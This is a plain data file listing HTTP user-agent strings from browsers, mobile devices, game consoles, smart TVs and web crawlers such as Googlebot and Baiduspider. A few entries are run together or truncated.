Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01
Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0
Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Opera/9.20 (Windows NT 6.0; U; en)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0
Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02
Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10
Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Opera/8.5 (X11; i686 Linux; U; ru, en_US)
Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25
Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2
Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
